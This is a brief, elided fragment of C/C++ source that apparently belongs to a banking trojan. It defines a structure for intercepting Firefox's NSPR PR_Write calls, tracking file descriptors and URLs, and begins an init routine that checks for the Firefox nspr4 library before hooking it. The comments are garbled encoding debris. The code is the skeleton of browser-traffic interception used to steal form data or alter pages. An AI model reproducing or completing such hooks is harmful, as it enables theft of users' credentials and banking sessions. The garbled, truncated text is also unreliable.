...
typedef struct
{
	PRFILEDESC *fd;							//����� ����������.
	LPSTR url;								//������� URL. ������������ ������ ��� �������.
	__int32 writeBytesToSkip;				//���������� ���� ������� ����� ��������������� � PR_Write().
...
void Nspr4Hook::init(void)
{
	...
	if(coreDllData.integrityLevel > Process::INTEGRITY_LOW && CWA(kernel32, GetModuleHandleW)(nspr4dll) != NULL) //��� ������� ������ firefox, ������ ������ ��������.
	{
